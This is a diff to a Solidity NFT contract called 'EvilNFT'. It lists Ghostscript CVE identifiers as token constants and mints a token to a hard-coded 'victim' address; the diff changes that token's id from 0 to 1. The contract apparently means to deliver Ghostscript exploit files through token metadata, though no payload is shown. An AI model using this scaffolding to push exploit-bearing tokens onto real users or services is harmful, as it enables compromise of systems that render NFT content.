@@ -4,8 +4,10 @@ pragma solidity ^0.8.0;
 // import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/utils/Strings.sol";
 
 contract EvilNFT is ERC721, Ownable {
+	using Strings for uint256;
     uint256 public constant GHOSTSCRIPT_CVE_2017_8291  = 0;
     uint256 public constant GHOSTSCRIPT_CVE_2018_16509 = 1;
     uint256 public constant GHOSTSCRIPT_CVE_2019_14811 = 2;
@@ -45,7 +47,7 @@ contract EvilNFT is ERC721, Ownable {
 
     constructor() ERC721("hack721", "HACK721") {
 		address victim = 0x321639c6572de66253dec41a959cd00137f1d476;
-		_mint(victim, 0);
+		_mint(victim, 1);
     }   
 
 	function _baseURI() internal view virtual returns (string memory) {
